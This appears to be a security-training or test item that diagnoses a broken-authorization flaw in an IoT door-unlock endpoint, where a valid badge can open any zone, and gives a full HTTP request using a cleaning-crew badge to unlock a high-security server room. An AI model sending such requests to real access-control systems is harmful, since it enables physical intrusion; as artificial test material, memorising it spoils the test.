diagnosis: The IoT badge reader custom strategy authenticates that badgeRfid is an active badge in the database, but sets req.accessZone to the client-supplied doorZoneId without checking if the badge holder has clearance permissions for that specific security door zone.
exploit_request:
POST /iot/doors/unlock HTTP/1.1
Host: facility.iotgateway.net
Content-Type: application/json

{"badgeRfid": "RFID_EMP_CLEANING_CREW_12", "doorZoneId": "ZONE_SERVER_ROOM_HIGH_SECURITY"}
